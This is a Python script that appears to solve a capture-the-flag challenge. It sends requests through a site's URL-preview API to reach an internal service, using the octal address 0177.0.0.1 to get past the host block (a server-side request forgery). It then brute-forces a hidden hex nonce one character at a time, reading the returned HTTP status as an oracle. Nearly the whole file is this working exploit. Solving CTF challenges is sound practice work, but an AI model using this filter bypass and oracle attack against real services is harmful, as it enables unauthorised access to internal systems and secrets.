import json, subprocess, time, sys, os
API = 'https://pointeroverflowctf.com/challenges/the-logic-inside/_app/api/preview'
JAR = '../../securenotes/work/sess.jar'
HOST = '0177.0.0.1'

def ask(guess):
    url = f'http://{HOST}:9001/flag?guess={guess}'
    body = json.dumps({'url': url})
    for attempt in range(6):
        p = subprocess.run(['curl', '-sS', '--max-time', '25', '-b', JAR, '-H', 'Content-Type: application/json', '--data', body, API], capture_output=True, text=True)
        try:
            d = json.loads(p.stdout)
        except Exception:
            d = {'raw': p.stdout[:100]}
        if d.get('ok'):
            return d.get('upstream_status')
        err = str(d.get('error', ''))
        if 'host blocked' in err:
            return 'BLOCKED'
        time.sleep(1.5 * (attempt + 1))
    return 'FAIL'
known = ''
for pos in range(16):
    found = None
    for c in '0123456789abcdef':
        st = ask(known + c)
        print(f'pos {pos} try {c} -> {st}', flush=True)
        if st == 200:
            found = c
            break
        if st in ('FAIL', 'BLOCKED'):
            print('request problem, aborting', flush=True)
            sys.exit(2)
        time.sleep(0.12)
    if found is None:
        print('no character found at pos', pos, flush=True)
        sys.exit(1)
    known += found
    print('PREFIX:', known, flush=True)
    with open('nonce_progress.txt', 'w') as f:
        f.write(known + '\n')
print('FINAL:', known)
st = ask(known)
print('full verify status:', st)
